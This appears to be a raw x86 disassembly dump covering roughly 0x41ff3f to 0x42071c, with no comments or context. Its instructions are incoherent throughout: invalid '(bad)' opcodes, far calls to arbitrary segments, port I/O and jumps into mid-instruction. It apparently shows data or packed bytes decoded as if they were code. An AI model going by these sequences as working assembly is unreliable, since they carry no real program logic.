  41ff3f:	test   al,0xd0
  41ff41:	sbb    ah,BYTE PTR [edi-0x2f]
  41ff44:	push   esi
  41ff45:	jp     0x41ff66
  41ff47:	ror    BYTE PTR [ecx],cl
  41ff49:	call   0xc3f3:0x3aa84047
  41ff50:	call   0x4856:0xf3e3dd3
  41ff57:	add    ebx,ebp
  41ff59:	add    al,BYTE PTR [esi+esi*4-0x7b]
  41ff5d:	xor    DWORD PTR [edx+0x14],esp
  41ff60:	pop    ds
  41ff61:	out    0x18,eax
  41ff63:	and    eax,0x769e2e41
  41ff68:	es and eax,0x97d21493
  41ff6e:	push   ebx
  41ff6f:	dec    ebp
  41ff70:	mov    esp,0x314babb4
  41ff75:	add    BYTE PTR [ebp-0x50977e2e],dl
  41ff7b:	dec    ecx
  41ff7c:	(bad)  
  41ff7d:	mov    ebp,0xf198d2e
  41ff82:	lods   al,BYTE PTR ds:[esi]
  41ff83:	xchg   edi,eax
  41ff84:	sahf   
  41ff85:	mov    ebp,ss
  41ff87:	mov    ebp,0x15d4e655
  41ff8c:	jae    0x41ffe6
  41ff8e:	add    BYTE PTR [edx-0x5c421187],0x4b
  41ff95:	sub    eax,0x16a2096f
  41ff9a:	shl    al,1
  41ff9c:	(bad)  
  41ff9d:	shl    BYTE PTR [ebx+0x2a],0x5e
  41ffa1:	call   0xceb8:0xf53112c8
  41ffa8:	mov    esi,0x3167c25b
  41ffad:	ror    ch,cl
  41ffaf:	push   eax
  41ffb0:	aaa    
  41ffb1:	adc    esi,DWORD PTR [eax]
  41ffb3:	bound  ecx,QWORD PTR ds:0xb2544f5
  41ffb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffba:	mov    al,0x78
  41ffbc:	xchg   al,dh
  41ffbe:	loopne 0x41ff7c
  41ffc0:	(bad)  [edi+0x3]
  41ffc3:	xchg   ecx,eax
  41ffc4:	ror    BYTE PTR [edi],cl
  41ffc6:	jnp    0x420043
  41ffc8:	shl    BYTE PTR [ebx+edx*4+0x138fb950],1
  41ffcf:	sub    esp,esi
  41ffd1:	push   es
  41ffd2:	xor    edx,DWORD PTR [ecx+eiz*2-0x76]
  41ffd6:	inc    edi
  41ffd7:	lods   eax,DWORD PTR ds:[esi]
  41ffd8:	test   DWORD PTR [ebp+ebx*1-0x4c8748a6],ecx
  41ffdf:	in     al,dx
  41ffe0:	jge    0x41ffd8
  41ffe2:	das    
  41ffe3:	cmp    ecx,edx
  41ffe5:	pop    eax
  41ffe6:	adc    dh,bh
  41ffe8:	mov    cl,0xa4
  41ffea:	jmp    0x41ff93
  41ffec:	adc    al,0x71
  41ffee:	inc    ebx
  41ffef:	push   edi
  41fff0:	fcomip st,st(7)
  41fff2:	pop    ds
  41fff3:	push   edx
  41fff4:	xor    esi,edi
  41fff6:	pop    eax
  41fff7:	jmp    DWORD PTR [eax]
  41fff9:	push   edi
  41fffa:	cmp    DWORD PTR [eax-0x35],0xffffff8b
  41fffe:	sbb    al,0x93
  420000:	cmp    edi,DWORD PTR [ebx-0x26]
  420003:	lock call 0xca8facf5
  420009:	push   es
  42000a:	cmp    BYTE PTR [ecx],cl
  42000c:	jl     0x420001
  42000e:	xlat   BYTE PTR ds:[ebx]
  42000f:	ds aad 0xed
  420012:	imul   ebx,DWORD PTR [ecx],0xa34e7862
  420018:	mov    dl,0xff
  42001a:	xchg   ch,ah
  42001c:	sbb    al,0x2b
  42001e:	push   0xffffffa3
  420020:	cmp    DWORD PTR [ecx+0x2a],esp
  420023:	imul   esi,DWORD PTR [eax+0x31ac9e19],0x48
  42002a:	nop
  42002b:	xor    ebx,DWORD PTR [ecx+0x2e]
  42002e:	dec    esp
  42002f:	out    dx,al
  420030:	mov    eax,ds:0x57691ce6
  420035:	cmp    edx,DWORD PTR [eax-0x6ea46a68]
  42003b:	addr16 adc ch,dh
  42003e:	xor    DWORD PTR [ebp+0x4f],0x7fa03a1e
  420045:	ins    DWORD PTR es:[edi],dx
  420046:	and    ecx,DWORD PTR [ebx-0x6ef3c696]
  42004c:	push   ebp
  42004d:	xor    BYTE PTR [edi+0x41],al
  420050:	(bad)  [esi]
  420052:	idiv   BYTE PTR [ecx]
  420054:	xchg   esi,eax
  420055:	fcom   QWORD PTR [ebp+0x42]
  420058:	lahf   
  420059:	div    BYTE PTR [eax-0x53]
  42005c:	jmp    0x420034
  42005e:	xor    edx,ebx
  420060:	js     0x42009e
  420062:	lahf   
  420063:	call   0x22c71d1a
  420068:	out    0x29,al
  42006a:	retf   
  42006b:	sub    esi,eax
  42006d:	adc    eax,0x8a664b8d
  420072:	push   es
  420073:	fnsave [esi+0x359371c7]
  420079:	mov    cl,0x23
  42007b:	pop    ss
  42007c:	shl    BYTE PTR [ebp+edx*4+0x50669b9e],1
  420083:	ss sbb eax,0x79559d8c
  420089:	push   edx
  42008a:	(bad)  
  42008b:	mov    al,ds:0xe8413c3c
  420090:	add    BYTE PTR [ebx-0x2e],al
  420093:	sbb    eax,0x4b1ab33
  420098:	int    0x24
  42009a:	scas   al,BYTE PTR es:[edi]
  42009b:	lea    esi,[ebx-0x4f]
  42009e:	jb     0x42010b
  4200a0:	mov    esp,0x2caa1c3d
  4200a5:	and    al,0xcf
  4200a7:	into   
  4200a8:	mov    al,0x90
  4200aa:	aaa    
  4200ab:	and    al,cl
  4200ad:	aad    0x75
  4200af:	add    bl,BYTE PTR [edx+ebx*4+0x50ddf626]
  4200b6:	scas   al,BYTE PTR es:[edi]
  4200b7:	jge    0x420046
  4200b9:	push   cs
  4200ba:	hlt    
  4200bb:	in     al,dx
  4200bc:	pop    edx
  4200bd:	repz sub eax,DWORD PTR ds:0x41be0303
  4200c4:	into   
  4200c5:	mov    edx,0x92da831b
  4200ca:	dec    ebx
  4200cb:	adc    DWORD PTR [ebp-0x69bda5ce],ecx
  4200d1:	lea    ecx,[esi]
  4200d3:	push   ebp
  4200d4:	sbb    bh,BYTE PTR [ebx]
  4200d6:	shr    al,1
  4200d8:	xlat   BYTE PTR ds:[ebx]
  4200d9:	cmp    edx,ebp
  4200db:	mov    al,ds:0xdf5805e4
  4200e0:	pop    edi
  4200e1:	sbb    bh,dl
  4200e3:	clc    
  4200e4:	loope  0x420075
  4200e6:	(bad)  
  4200e8:	or     eax,0xf37f8012
  4200ed:	cs stos DWORD PTR es:[edi],eax
  4200ef:	xor    dh,ch
  4200f1:	xchg   ebp,eax
  4200f2:	xchg   ebp,eax
  4200f3:	lock sub DWORD PTR [edi+edx*8],ecx
  4200f7:	mov    bh,0xb2
  4200f9:	es xchg ecx,eax
  4200fb:	mov    ds:0xef6a9391,eax
  420100:	imul   edx,ecx,0x4d17f2be
  420106:	xchg   ebx,eax
  420107:	fs jnp 0x420102
  42010a:	or     eax,0x7f4db680
  42010f:	pop    ebp
  420110:	mov    dh,0xb1
  420112:	in     eax,0xd6
  420114:	xchg   ebx,eax
  420115:	das    
  420116:	stos   DWORD PTR es:[edi],eax
  420117:	arpl   WORD PTR [eax+0x1c2961eb],di
  42011d:	push   0xbe4eb6f7
  420122:	je     0x4200aa
  420124:	mov    edi,0x7c91c915
  420129:	cmp    dh,bl
  42012b:	adc    dl,al
  42012d:	div    BYTE PTR [ebx+0x210fd5ce]
  420133:	(bad)  
  420134:	xchg   edx,eax
  420135:	daa    
  420136:	push   eax
  420137:	push   ebp
  420138:	mov    ds:0x64a55b70,eax
  42013d:	test   BYTE PTR [ebx+0x67d11f46],0x9c
  420144:	popa   
  420145:	and    edx,ecx
  420147:	out    0x7f,eax
  420149:	cmp    dl,bh
  42014b:	aam    0x9d
  42014d:	xor    al,0xe7
  42014f:	ret    
  420150:	cmp    al,BYTE PTR [esi-0x640ed997]
  420156:	loop   0x4201d3
  420158:	xchg   edi,eax
  420159:	in     eax,dx
  42015a:	nop
  42015b:	xchg   esi,eax
  42015c:	enter  0x48f1,0x2f
  420160:	out    0xeb,eax
  420162:	ds cmp BYTE PTR es:[ebx],dl
  420166:	mov    eax,ds:0xf857bf89
  42016b:	mov    al,ds:0x30062499
  420170:	nop
  420171:	mov    al,ds:0x19798be3
  420176:	adc    edx,0x43f497ed
  42017c:	sub    BYTE PTR [edx+0x27],0x51
  420180:	pop    es
  420181:	or     eax,0x550568b8
  420186:	inc    eax
  420187:	mov    edi,0xaabf72f6
  42018c:	or     BYTE PTR [ebx],bl
  42018e:	lahf   
  42018f:	sbb    al,0xd8
  420191:	imul   ebp,esi,0x3f
  420194:	fwait
  420195:	dec    esi
  420196:	push   ss
  420197:	fsubr  st,st(1)
  420199:	xchg   ebx,eax
  42019a:	sub    eax,esp
  42019c:	add    BYTE PTR [edx+0x52],al
  42019f:	adc    al,0xed
  4201a1:	pop    es
  4201a2:	call   0x57c9:0x37821987
  4201a9:	jns    0x42021f
  4201ab:	das    
  4201ac:	xor    ch,BYTE PTR [edi-0x137e10f3]
  4201b2:	pusha  
  4201b3:	jecxz  0x4201ca
  4201b5:	sbb    al,0x5c
  4201b7:	fimul  DWORD PTR [ebp-0x787be14a]
  4201bd:	add    esp,DWORD PTR [eax+0x5dbaef94]
  4201c3:	sub    eax,0xd192353d
  4201c8:	in     al,dx
  4201c9:	int    0xda
  4201cb:	mov    eax,ds:0x74d95eba
  4201d0:	add    BYTE PTR [ecx],cl
  4201d2:	dec    ecx
  4201d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201d4:	jmp    0x4201f4
  4201d6:	inc    esi
  4201d7:	in     eax,dx
  4201d8:	enter  0x3e74,0x5d
  4201dc:	cli    
  4201dd:	jne    0x420246
  4201df:	scas   eax,DWORD PTR es:[edi]
  4201e0:	stc    
  4201e1:	mov    ebp,0xbf08329d
  4201e6:	pop    ebp
  4201e7:	mov    bl,0xbc
  4201e9:	fdivr  DWORD PTR [ebp+0x1b]
  4201ec:	adc    BYTE PTR [ecx-0x2cbce896],bh
  4201f2:	sub    esi,DWORD PTR [ebp+0x32]
  4201f5:	les    ecx,FWORD PTR [eax+0x60]
  4201f8:	mov    dl,0xea
  4201fa:	cmp    eax,0xb899d36a
  4201ff:	int    0x24
  420201:	jno    0x4201d6
  420203:	add    al,0xdd
  420205:	lock ins DWORD PTR es:[edi],dx
  420207:	mul    BYTE PTR [ecx]
  420209:	xor    ch,BYTE PTR [ecx-0x6c]
  42020c:	jnp    0x42023d
  42020e:	out    dx,eax
  42020f:	call   0x64c18a2e
  420214:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420215:	mov    ebp,0xb924b5a8
  42021a:	dec    edi
  42021b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42021c:	add    ecx,DWORD PTR [esi-0x7e]
  42021f:	mov    DWORD PTR [ebx],edx
  420221:	pop    ebx
  420222:	xchg   BYTE PTR [edx+0x85a43e3],ch
  420228:	(bad)  
  420229:	stos   BYTE PTR es:[edi],al
  42022a:	call   0xb15b:0xe1bc0a5d
  420231:	mov    eax,0xa104ada8
  420236:	sbb    BYTE PTR [eax+0x3a9e8dcd],ah
  42023c:	pop    ss
  42023d:	jg     0x4202ab
  42023f:	dec    ebp
  420240:	stc    
  420241:	sub    ecx,DWORD PTR [ebx+ebp*2]
  420244:	int    0xcd
  420246:	(bad)  
  420247:	enter  0xe370,0xf5
  42024b:	repz jo 0x4202ae
  42024e:	(bad)  
  42024f:	fistp  QWORD PTR [eax+0x1c]
  420252:	sub    al,0x1a
  420254:	jae    0x4201e4
  420256:	fdivr  DWORD PTR [eax]
  420258:	xchg   BYTE PTR [esi+eax*1-0x64],ch
  42025c:	cwde   
  42025d:	jns    0x420296
  42025f:	jae    0x4202db
  420261:	xchg   BYTE PTR [edx+0x549187a9],al
  420267:	cli    
  420268:	jb     0x420273
  42026a:	aaa    
  42026b:	into   
  42026c:	jmp    0x4202c0
  42026e:	inc    ebp
  42026f:	daa    
  420270:	dec    ecx
  420271:	xchg   ecx,eax
  420272:	ja     0x420261
  420274:	jo     0x42026b
  420276:	test   al,0xba
  420278:	cwde   
  420279:	dec    ebp
  42027a:	dec    ecx
  42027b:	call   0xcf074501
  420280:	mov    dh,0xbf
  420282:	pusha  
  420283:	sbb    edi,edx
  420285:	sbb    DWORD PTR [eax],0x21a216a5
  42028b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42028c:	pushw  0x6d1b
  420290:	push   edi
  420291:	add    ecx,DWORD PTR [eax+0x5b]
  420294:	adc    eax,0xe98cd332
  420299:	and    BYTE PTR [edx],bh
  42029b:	pop    ds
  42029c:	add    BYTE PTR [ecx],dh
  42029e:	pop    edx
  42029f:	jbe    0x420256
  4202a1:	mov    eax,0xbecb2db7
  4202a6:	mov    dh,0x56
  4202a8:	dec    edi
  4202a9:	leave  
  4202aa:	pop    ebp
  4202ab:	xchg   DWORD PTR [ebx-0x5aa0f232],esi
  4202b1:	(bad)  
  4202b2:	adc    BYTE PTR [ebp+0x19],al
  4202b5:	jmp    0xfa9ff48b
  4202ba:	inc    eax
  4202bb:	test   al,0x14
  4202bd:	ss loope 0x420307
  4202c0:	pushf  
  4202c1:	fs sub dl,ch
  4202c4:	or     eax,0xe5cd08be
  4202c9:	push   cs
  4202ca:	scas   al,BYTE PTR es:[edi]
  4202cb:	jnp    0x4202a0
  4202cd:	and    ebx,esp
  4202cf:	or     al,0x1
  4202d1:	xor    eax,0x89b3f098
  4202d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202d7:	lock shl DWORD PTR [edx-0x75f95671],0x11
  4202df:	dec    edx
  4202e0:	(bad)  
  4202e1:	sbb    BYTE PTR [ebx-0x7b],0x59
  4202e5:	sahf   
  4202e6:	add    esp,ecx
  4202e8:	(bad)  
  4202e9:	aas    
  4202ea:	retf   0x3cb1
  4202ed:	xor    ch,BYTE PTR [edx-0x43619152]
  4202f3:	push   ebp
  4202f4:	xor    bl,BYTE PTR [esi-0x32]
  4202f7:	ret    0x1c46
  4202fa:	dec    edx
  4202fb:	mov    DWORD PTR [ebx+0x4e],0x9396125c
  420302:	fcom   DWORD PTR [edi+0x2c]
  420305:	ficom  WORD PTR [esi+esi*2]
  420308:	sbb    dl,ah
  42030a:	icebp  
  42030b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42030c:	and    BYTE PTR ds:0xcefd0d7f,ch
  420312:	mov    BYTE PTR [eax],dl
  420314:	loopne 0x42038b
  420316:	jno    0x420311
  420318:	mov    esi,0x56c3275e
  42031d:	mov    dh,0xb5
  42031f:	ficom  DWORD PTR [edx-0x1e]
  420322:	fdiv   QWORD PTR [edx]
  420324:	or     eax,0x76586014
  420329:	jg     0x4202ed
  42032b:	xchg   edi,eax
  42032c:	cli    
  42032d:	cs (bad) 
  42032f:	loop   0x420376
  420331:	les    eax,FWORD PTR [ecx-0x37]
  420334:	mov    ss,WORD PTR [ebx]
  420336:	in     al,dx
  420337:	retf   0x84a6
  42033a:	leave  
  42033b:	add    al,0xb4
  42033d:	mov    ebx,DWORD PTR [ecx-0x52]
  420340:	shl    DWORD PTR [ecx],cl
  420342:	mov    esi,0xb64acfa8
  420347:	pop    edx
  420348:	push   edi
  420349:	dec    esp
  42034a:	(bad)  
  42034b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42034c:	fdivr  st(7),st
  42034e:	cdq    
  42034f:	(bad)  
  420350:	fldcw  WORD PTR [ebx+0x71]
  420353:	lods   al,BYTE PTR ds:[esi]
  420354:	cdq    
  420355:	arpl   si,si
  420357:	fldenv [edi]
  420359:	data16 or ch,BYTE PTR [edi]
  42035c:	add    DWORD PTR [ebp-0x50cbce8b],0xe33a6612
  420366:	add    eax,0xc613c4bb
  42036b:	xchg   edi,eax
  42036c:	cmp    bl,cl
  42036e:	fld    TBYTE PTR [ebx]
  420370:	sbb    DWORD PTR [eax-0x66aa89df],ebp
  420376:	ss xor al,0xbe
  420379:	sub    esi,DWORD PTR gs:[edi-0x33cf8953]
  420380:	add    ebx,DWORD PTR ds:0x53bcbb53
  420386:	pusha  
  420387:	mov    ebp,0xdcb7c1a0
  42038c:	and    cl,BYTE PTR [eax+esi*8]
  42038f:	add    DWORD PTR [ebp-0x2e8649fd],edi
  420395:	adc    DWORD PTR [eax-0x1e9c50fb],esi
  42039b:	cmp    eax,0xfd3c3644
  4203a0:	dec    ecx
  4203a1:	clc    
  4203a2:	mov    bh,0x85
  4203a4:	jb     0x420394
  4203a6:	or     BYTE PTR [edx],0x99
  4203a9:	popa   
  4203aa:	fild   WORD PTR [esi+0x517e278e]
  4203b0:	mov    ds:0x9384f3d5,al
  4203b5:	cmp    BYTE PTR [edx+0x7b77e01],al
  4203bb:	imul   esp,esi,0xffffffb9
  4203be:	jbe    0x420419
  4203c0:	(bad)  
  4203c1:	rol    BYTE PTR [ebx-0x11],0x37
  4203c5:	mov    esp,0xae75383e
  4203ca:	pop    ds
  4203cb:	scas   al,BYTE PTR es:[edi]
  4203cc:	xchg   esi,eax
  4203cd:	out    0x88,eax
  4203cf:	and    ah,BYTE PTR [esi]
  4203d1:	test   al,0x46
  4203d3:	mov    al,ds:0x275e6a2a
  4203d8:	jle    0x4203ce
  4203da:	cmp    eax,0x3a30562c
  4203df:	adc    al,0xc2
  4203e1:	jo     0x42038c
  4203e3:	mov    ah,0xb0
  4203e5:	popf   
  4203e6:	mov    BYTE PTR [edi-0xd],bl
  4203e9:	nop
  4203ea:	sub    BYTE PTR [ecx-0x40261c1e],dl
  4203f0:	cmp    eax,0xbe990644
  4203f5:	inc    ecx
  4203f6:	iret   
  4203f7:	out    dx,al
  4203f8:	mov    ebp,0x20d90210
  4203fd:	cmp    eax,esi
  4203ff:	xor    BYTE PTR [ecx-0x72],dl
  420402:	cmp    eax,0xe3edc09d
  420407:	mov    bh,0x64
  420409:	out    0x5f,al
  42040b:	leave  
  42040c:	test   eax,0xb78887b9
  420411:	test   al,0x8
  420413:	movd   mm0,esi
  420416:	sahf   
  420417:	jp     0x4203d4
  420419:	pop    es
  42041a:	repnz scas al,BYTE PTR es:[edi]
  42041c:	jae    0x4203f0
  42041e:	mov    ebx,0x942028eb
  420423:	jl     0x42045c
  420425:	pop    ebp
  420426:	sub    DWORD PTR [ebp-0x4715bf22],edx
  42042c:	leave  
  42042d:	ins    BYTE PTR es:[edi],dx
  42042e:	mov    dh,0x90
  420430:	adc    DWORD PTR [ebx+0x45],esp
  420433:	mov    ch,0x61
  420435:	mov    dh,0xfd
  420437:	mov    al,ds:0x99f7a3c6
  42043c:	push   eax
  42043d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42043e:	aad    0x56
  420440:	pop    ds
  420441:	add    DWORD PTR [edi],edi
  420443:	div    BYTE PTR [eax+0x6c87e92b]
  420449:	or     eax,0xbe2af7aa
  42044e:	pop    ecx
  42044f:	or     DWORD PTR [edi-0x6c],ebp
  420452:	mov    ecx,0x7e95a4e
  420457:	jbe    0x4204ca
  420459:	and    eax,0x735fee71
  42045e:	fisttp WORD PTR [esi]
  420460:	shr    BYTE PTR [edx+0x3],1
  420463:	add    ah,ah
  420465:	xchg   esp,eax
  420466:	lds    ebp,FWORD PTR [ebx]
  420468:	push   0x6596d097
  42046d:	jmp    0x13e31f8a
  420472:	mov    eax,0xa13fdf54
  420477:	push   edx
  420478:	add    DWORD PTR [edi],edi
  42047a:	ins    DWORD PTR es:[edi],dx
  42047b:	pusha  
  42047c:	repz or BYTE PTR [ebp+esi*1+0x6ab49424],0xe3
  420485:	out    0x55,al
  420487:	(bad)  
  420488:	call   0x4d66:0x982d1164
  42048f:	inc    edx
  420490:	xor    al,0x7a
  420492:	pop    es
  420493:	int    0xa
  420495:	dec    esi
  420496:	ss fwait
  420498:	stos   DWORD PTR es:[edi],eax
  420499:	sahf   
  42049a:	sbb    al,0x5c
  42049c:	pop    ebx
  42049d:	mov    ebx,0xaf0c180f
  4204a2:	push   cs
  4204a3:	jl     0x4204bf
  4204a5:	popa   
  4204a6:	lods   al,BYTE PTR ds:[esi]
  4204a7:	mov    bh,0xd6
  4204a9:	mov    ds:0x85062e28,al
  4204ae:	out    dx,al
  4204af:	in     al,dx
  4204b0:	fsubr  QWORD PTR [edx-0x62c1155f]
  4204b6:	xor    DWORD PTR [esi+edx*8-0x7ac678f5],ebp
  4204bd:	and    al,dl
  4204bf:	out    dx,eax
  4204c0:	xchg   BYTE PTR [esi-0x37],cl
  4204c3:	xchg   ebp,eax
  4204c4:	fs or  eax,0xed2dcb9
  4204ca:	jge    0x42047f
  4204cc:	cmc    
  4204cd:	cdq    
  4204ce:	ss push cs
  4204d0:	cmp    al,0x92
  4204d2:	xlat   BYTE PTR ds:[ebx]
  4204d3:	repnz sbb eax,0x597fe015
  4204d9:	dec    esp
  4204da:	sub    ebp,DWORD PTR [ebx-0x2c]
  4204dd:	pop    ebx
  4204de:	inc    edx
  4204df:	(bad)  
  4204e0:	and    DWORD PTR [edi-0x1d8c1511],ecx
  4204e6:	mov    dh,0x17
  4204e8:	push   es
  4204e9:	sbb    al,0x7e
  4204eb:	jmp    FWORD PTR [edi]
  4204ed:	xor    DWORD PTR [ebp-0x23c33d4f],edi
  4204f3:	fs cmp al,0x70
  4204f6:	jo     0x42048a
  4204f8:	xchg   ecx,eax
  4204f9:	and    BYTE PTR [edi-0x2120236d],dh
  4204ff:	icebp  
  420500:	fcom   QWORD PTR [ebp-0x20322871]
  420507:	mov    esp,esp
  420509:	mov    bh,0x12
  42050b:	xchg   ah,ah
  42050d:	je     0x420526
  42050f:	cld    
  420510:	xchg   edi,eax
  420511:	sbb    DWORD PTR [ebx+esi*8+0x11],edi
  420515:	pop    ebx
  420516:	ins    DWORD PTR es:[edi],dx
  420517:	jb     0x4204f9
  420519:	xchg   ebx,eax
  42051a:	dec    esi
  42051b:	and    esp,DWORD PTR [ebx-0x6153069b]
  420521:	dec    ebp
  420522:	xchg   BYTE PTR [ebx+0x532125da],ch
  420528:	test   bh,0x39
  42052b:	mov    ds:0xa5e41dfa,al
  420530:	mov    esp,0x7dcf6fb9
  420535:	push   0xffffff81
  420537:	jne    0x420573
  420539:	cmc    
  42053a:	xchg   ecx,eax
  42053b:	clc    
  42053c:	aam    0x8f
  42053e:	dec    edi
  42053f:	sti    
  420540:	outs   dx,BYTE PTR ds:[esi]
  420541:	mov    ch,0x1e
  420543:	mov    bh,0xb5
  420545:	mov    esp,eax
  420547:	pop    ss
  420548:	enter  0x15e4,0x8f
  42054c:	inc    ebx
  42054d:	jbe    0x42053b
  42054f:	es jge 0x4204f9
  420552:	outs   dx,BYTE PTR ds:[esi]
  420553:	pop    ebx
  420554:	push   ecx
  420555:	dec    ecx
  420556:	std    
  420557:	pop    es
  420558:	push   edi
  420559:	gs loope 0x420502
  42055c:	jmp    DWORD PTR [esi-0x7d965333]
  420562:	jnp    0x4205c8
  420564:	jne    0x42050f
  420566:	mov    eax,0xf2789f11
  42056b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42056c:	js     0x420500
  42056e:	jnp    0x42057b
  420570:	mov    bh,0x91
  420572:	xlat   BYTE PTR cs:[ebx]
  420574:	into   
  420575:	or     BYTE PTR [edx],dh
  420577:	aas    
  420578:	adc    ebp,edi
  42057a:	sbb    ebx,DWORD PTR ds:0x404ea690
  420580:	daa    
  420581:	and    DWORD PTR [edx],ebp
  420583:	push   ds
  420584:	lock hlt 
  420586:	mov    al,ds:0x505bdfb8
  42058b:	and    edx,DWORD PTR [ebx+0x188508d8]
  420591:	stc    
  420592:	ret    0x4fa0
  420595:	or     esi,DWORD PTR [ebx+0x26]
  420598:	ins    BYTE PTR es:[edi],dx
  420599:	(bad)  
  42059a:	sub    DWORD PTR [edi-0x2293d7df],esi
  4205a0:	popf   
  4205a1:	dec    esi
  4205a2:	jns    0x42058d
  4205a4:	mov    ds:0xc4fc11f,eax
  4205a9:	sbb    BYTE PTR ds:0x7196c0e2,0x8d
  4205b0:	adc    DWORD PTR [eax-0x1b7992c8],ebx
  4205b6:	jecxz  0x420618
  4205b8:	adc    BYTE PTR [esi+ebx*2+0x42],0x1e
  4205bd:	loope  0x4205e3
  4205bf:	cmp    eax,0x97151900
  4205c4:	push   ss
  4205c5:	int    0xea
  4205c7:	mov    ebx,0x9d7a975f
  4205cc:	jbe    0x42060e
  4205ce:	add    eax,0x7ccc1250
  4205d3:	mov    ds:0x785e5bad,al
  4205d8:	stos   BYTE PTR es:[edi],al
  4205d9:	xchg   ebx,eax
  4205da:	je     0x4205ce
  4205dc:	ret    
  4205dd:	mov    eax,0x5739d750
  4205e2:	pop    ecx
  4205e3:	xlat   BYTE PTR ds:[ebx]
  4205e4:	test   DWORD PTR [ebx-0x2f],ebp
  4205e7:	mov    edi,0x36e763f0
  4205ec:	sbb    al,0x81
  4205ee:	(bad)  
  4205ef:	out    dx,al
  4205f0:	xchg   esi,eax
  4205f1:	sub    edi,ebp
  4205f3:	dec    ecx
  4205f4:	ins    BYTE PTR es:[edi],dx
  4205f5:	cli    
  4205f6:	nop
  4205f7:	fadd   QWORD PTR [ebp+0x3886db7]
  4205fd:	pop    ss
  4205fe:	pusha  
  4205ff:	mov    ebp,0xd7dc8b37
  420604:	dec    edx
  420605:	gs mov ebx,0x65e5d4ad
  42060b:	(bad)  
  42060c:	outs   dx,BYTE PTR ds:[esi]
  42060d:	jp     0x4205fc
  42060f:	jp     0x42065a
  420611:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420612:	mov    eax,0xad3ff04d
  420617:	dec    esi
  420618:	arpl   WORD PTR [edx-0x4994ebd7],di
  42061e:	daa    
  42061f:	push   ecx
  420620:	call   0xf815:0x985a39c2
  420627:	(bad)  
  420628:	loop   0x4205dd
  42062a:	cwde   
  42062b:	or     esi,DWORD PTR [eax+0x71b283af]
  420631:	xchg   ebp,eax
  420632:	pop    esp
  420633:	sbb    DWORD PTR [ebx+0x43],edx
  420636:	jb     0x4206b7
  420638:	pop    esp
  420639:	arpl   WORD PTR [ebp+0x3c740ffd],ax
  42063f:	or     cl,BYTE PTR [eax+ebp*8+0x12eaaa61]
  420646:	pop    ebp
  420647:	pop    ds
  420648:	pop    edx
  420649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42064a:	pop    esi
  42064b:	ror    DWORD PTR [ecx],0x2b
  42064e:	mov    DWORD PTR [esi],ebx
  420650:	je     0x42061e
  420652:	xlat   BYTE PTR ds:[ebx]
  420653:	call   0x3f1a5bc8
  420658:	fcom   st(2)
  42065a:	fld    DWORD PTR ds:0xf4f5486e
  420660:	fld    QWORD PTR [edx+0xb2b7616]
  420666:	push   0x63
  420668:	and    eax,0x49216900
  42066d:	sti    
  42066e:	jns    0x4206b6
  420670:	loope  0x4205f3
  420672:	jge    0xb31b6ff3
  420678:	dec    ebx
  420679:	xchg   ecx,eax
  42067a:	push   eax
  42067b:	rcr    BYTE PTR [edx],1
  42067d:	sub    DWORD PTR [ecx],eax
  42067f:	fwait
  420680:	sbb    al,0xaf
  420682:	sub    edi,0xffffffe8
  420685:	xchg   esp,eax
  420686:	and    BYTE PTR [esi+0x1b],0x96
  42068a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42068b:	xor    ch,ch
  42068d:	bound  ebp,QWORD PTR [eax-0x53]
  420690:	or     eax,0x9fb1b402
  420695:	in     eax,dx
  420696:	std    
  420697:	dec    ebp
  420698:	mov    edx,0xefb4ec5f
  42069d:	enter  0x73ae,0x6e
  4206a1:	pop    esp
  4206a2:	push   cs
  4206a3:	cmp    eax,0x70ae9d5d
  4206a8:	pcmpeqd mm3,QWORD PTR ds:0x91036852
  4206af:	xchg   edi,eax
  4206b0:	mov    ah,0x1f
  4206b2:	pop    edx
  4206b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206b4:	nop
  4206b5:	inc    edi
  4206b6:	std    
  4206b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206b8:	add    ebp,eax
  4206ba:	xor    al,0x8b
  4206bc:	dec    esp
  4206bd:	fistp  WORD PTR [ebx]
  4206bf:	in     eax,0xb
  4206c1:	(bad)  
  4206c2:	leave  
  4206c3:	mov    ds:0xd0d54b89,al
  4206c8:	push   0x5
  4206ca:	lahf   
  4206cb:	pop    esi
  4206cc:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4206ce:	jnp    0x42069b
  4206d0:	popf   
  4206d1:	sbb    ecx,DWORD PTR [esi+0x7d]
  4206d4:	ja     0x42072b
  4206d6:	bound  edi,QWORD PTR [ebp-0x5d]
  4206d9:	jg     0x420733
  4206db:	mov    ds:0xd4c19ecb,al
  4206e0:	adc    edx,esp
  4206e2:	fadd   st,st(6)
  4206e4:	fild   DWORD PTR [esi-0x25]
  4206e7:	lds    edi,FWORD PTR [eax+0x33]
  4206ea:	and    al,0x3b
  4206ec:	int3   
  4206ed:	xlat   BYTE PTR ds:[ebx]
  4206ee:	in     al,0xa4
  4206f0:	push   esi
  4206f1:	jo     0x4206c0
  4206f3:	lods   al,BYTE PTR ds:[esi]
  4206f4:	lock pop esp
  4206f6:	xchg   ecx,eax
  4206f7:	sbb    ah,BYTE PTR [edi-0x51]
  4206fa:	sbb    esp,eax
  4206fc:	dec    esp
  4206fd:	mov    dh,0x52
  4206ff:	retf   0xfbbf
  420702:	into   
  420703:	and    BYTE PTR [eax+0x50],al
  420706:	and    cl,BYTE PTR [esi]
  420708:	js     0x42068b
  42070a:	xor    ch,cl
  42070c:	dec    esp
  42070d:	xchg   ebp,eax
  42070e:	pop    esp
  42070f:	jo     0x420712
  420711:	mov    esi,0xccf431ec
  420716:	(bad)  
  420718:	xchg   ebp,eax
  420719:	jae    0x42076d
  42071b:	xchg   ebx,eax
  42071c:	xor    DWORD PTR [esi+0x1278378],esp
